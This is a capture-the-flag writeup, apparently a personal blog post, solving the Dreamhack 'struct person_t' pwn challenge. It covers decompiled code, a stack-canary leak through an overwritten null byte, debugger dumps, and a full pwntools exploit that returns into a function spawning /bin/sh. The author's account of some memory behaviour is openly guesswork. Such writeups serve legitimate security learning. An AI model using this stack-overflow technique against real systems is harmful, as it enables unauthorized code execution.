+++
date = '2026-05-08'
draft = false
title = 'Dreamhack struct person_t Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

Finally finished the first pwn class in Dreamhack!

## Challenge overview
    
I created a program with my own structure, struct person_t! 🧑‍🦱

---

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _BYTE v4[32]; // [rsp+0h] [rbp-70h] BYREF
  char v5[56]; // [rsp+20h] [rbp-50h] BYREF
  __int64 v6; // [rsp+58h] [rbp-18h] BYREF
  __int128 v7; // [rsp+60h] [rbp-10h] BYREF

  *((_QWORD *)&v7 + 1) = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("Enter name: ");
  sub_40123A(v5, 56);
  printf("Enter age: ");
  __isoc99_scanf("%d", &v7);
  printf("Enter height: ");
  __isoc99_scanf("%lf", &v6);
  printf("Enter M (Male) or F (Female): ");
  sub_40123A((char *)&v7 + 4, 5);
  printf("Hi %s.\n", v5);
  printf("What's your nationality? ");
  sub_40123A(v4, 128);
  return 0;
}
```

## Identifying the vulnerabilities


This is a buffer overflow challenge, with a canary enabled, after a quick checksec. So we need to leak it first.

Let's look at `sub_40123A`, the reading function:

```c
unsigned __int8 *__fastcall sub_40123A(unsigned __int8 *buf, size_t size)
{
  unsigned __int8 *result; // rax
  ssize_t bytes_read; // [rsp+18h] [rbp-8h]

  bytes_read = read(0, buf, size);
  if ( bytes_read <= 0 )
  {
    puts("read() error");
    exit(1);
  }
  result = (unsigned __int8 *)buf[bytes_read - 1];
  if ( (_BYTE)result == 10 )
  {
    result = &buf[bytes_read - 1];
    *result = 0;
  }
  return result;
}
```

This reads into the first parameter, checks if the last character written is a newline, and if so replaces it with a null byte.

Something interesting though, this line, `reading_func((unsigned __int8 *)&v7 + 4, 5u);`, will allow us to write 5 bytes at `v7+4`; this means overwriting one byte of the canary, the first byte - `0x00`; So if we can print `v7`, it won't stop reading at the null byte and will keep printing the canary as well.

But the variable getting printed is `v5`. No problem, we can use this overwrite-the-null-byte technique for all of our input. As long as we don't send a newline as the last character, it's not going to get a null byte written over it.

Also notice how `v7` holds both the age integer (first 4 bytes) and the M/F check (next 5!).

After crafting my first payload, I noticed something extremely strange started happening:

```bash
pwndbg> x/50gx $rsp
0x7ffe9d8ed050: 0x0000000000000040      0x0000000000000008
0x7ffe9d8ed060: 0x0000000000008000      0x218c032900000000
0x7ffe9d8ed070: 0x4141414141414141      0x4141414141414141
0x7ffe9d8ed080: 0x4141414141414141      0x4141414141414141
0x7ffe9d8ed090: 0x4141414141414141      0x4141414141414141
0x7ffe9d8ed0a0: 0x4141414141414141      0x0000000000000000
0x7ffe9d8ed0b0: 0x9898989800000000      0x4f5443fd5a2d4b00
0x7ffe9d8ed0c0: 0x00007ffe9d8ed1d8      0x00007f1532a02f75
0x7ffe9d8ed0d0: 0x00007f1532bf5000      0x00000000004012b2
```

The wrong half of `v7` was getting written into, and `v6` was just getting left completely empty! Even stranger, sending `v6` like `payload = p64(0x292929290a292929)` (with a nullbyte at *exactly* that position) would overwrite the null byte of the canary!

Sending 6 bytes of `v7` worked as well, even though we're only supposed to be able to write 5; this was going directly into the canary as well. But this made sense, as they were next to each other; So what the hell was happening with `v6`?

After this whole shenanigan, I started investigating in pwndbg further, and I finally found a working solution:

- Send all the payloads with `sendline`

- Don't send bytes, send numbers like `b"-595821443.5137254"`.

I was trying to get `v6` to stay in its place, and sending a negative value seemed to do the trick - so I ran `p/lf 0xc1c1c1c1c1c1c1c1` in `pwndbg` and went ahead and used that. For the decimal, sending a negative value made it move to the lower part of the address as well. 

I won't question it too much, because we got a leak, finally!

```bash
[*] Switching to interactive mode
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc1\xc1\xc1\xc1\xc1\xc1\xc1\xc1\xff\xff\xff\xffDDDDD\xac8\xfa\xc0\x8a\x87Y\x88է\x93\xfc\x7f.
What's your nationality? *** stack smashing detected ***: terminated
[*] Got EOF while reading in interactive
```

To fix the stack smashing, I just sent the last payload with `send` instead of `sendline`.

After receiving the canary, I started looking through IDA more and found this function:

```c
int sub_401216()
{
  return execve("/bin/sh", 0, 0);
}
```

So, easy peasy! I made it jump to `0x40121A` though, after the `push rbp`.


![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/structperson/deploy/chall')

context.arch = 'amd64'
cyberedu = '34.185.222.215:30484'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

#gdb.attach(p, gdbscript = '''
#b * 0x40141E
#''')

#v5- name
p.recvuntil(b": ")
payload = b"A"*56
p.sendline(payload)

#v7 -age - 4bytes ah lol
p.recvuntil(b": ")
payload = b"-1" 
#just overflow cro
p.sendline(payload)

#v6 - height
#val = -595821443.5137254
p.recvuntil(b": ")
payload = b"-595821443.5137254"
#i did p/lf 0xc1c1c1c1c1c1c1c1 in pwndbg lol
#wtf - sending a newline somewhere in the double overwrites the canary null byte w the first byte...
p.sendline(payload)

#v7 + 4
p.recvuntil(b": ")
payload = b"D"*4 + b"d"
p.send(payload)

p.recvuntil(b"d")

data = p.recv(7)
val = u64(data.rjust(8, b"\x00"))
print(hex(val))

p.recvuntil(b"? ")
win = 0x40121A
ret = 0x40101a
payload = ( b"A" * 32 + #v4
            b"B" * 56 + #v5
            b"C" * 8 + #v6
            b"D" * 8 + #v7
            p64(val) + #canary
            b"E" * 8 + #rbp
            p64(win)
          )
p.sendline(payload)
p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/structpersont.py)**.
